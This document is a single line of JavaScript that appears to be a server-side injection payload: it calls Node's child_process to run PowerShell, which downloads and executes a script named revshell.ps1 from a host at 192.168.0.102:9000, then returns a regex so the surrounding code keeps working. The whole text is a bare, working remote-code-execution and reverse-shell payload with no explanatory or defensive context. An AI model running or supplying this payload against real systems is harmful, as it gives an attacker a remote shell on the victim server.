(function(){cp=require('child_process');cp.exec('powershell IEX (New-Object Net.WebClient).DownloadString("http://192.168.0.102:9000/revshell.ps1")');  return /a/})()
